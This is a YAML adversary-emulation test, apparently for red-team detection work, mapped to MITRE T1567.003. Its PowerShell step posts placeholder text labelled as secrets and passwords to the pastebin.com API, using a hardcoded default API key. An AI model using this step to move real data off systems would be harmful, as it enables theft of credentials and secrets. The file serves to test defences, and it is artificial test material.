api_version: "2.0"
name: Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)
description: "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n"
args:
    - name: api_key
      type: string
      default: 6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0
uuid: c2e8ab6e-431e-460a-a2aa-3bc6a32022e3
mitre:
    tactics:
        - 'TA0010: Exfiltration'
    techniques:
        - 'T1567: Exfiltration Over Web Service'
    subtechniques:
        - 'T1567.003: Exfiltration to Text Storage Sites'
requirements:
    platforms:
        - os: windows
steps:
    - name: exfiltrate-data-with-http-post-to-text-storage-sites---pastebin.com-(windows)
      inline: |
        $apiKey = "{{.Args.api_key}}"
        $content = "secrets, api keys, passwords..."
        $url = "https://pastebin.com/api/api_post.php"
        $postData = @{
          api_dev_key   = $apiKey
          api_option    = "paste"
          api_paste_code = $content
        }
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
        Write-Host "Your paste URL: $response"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
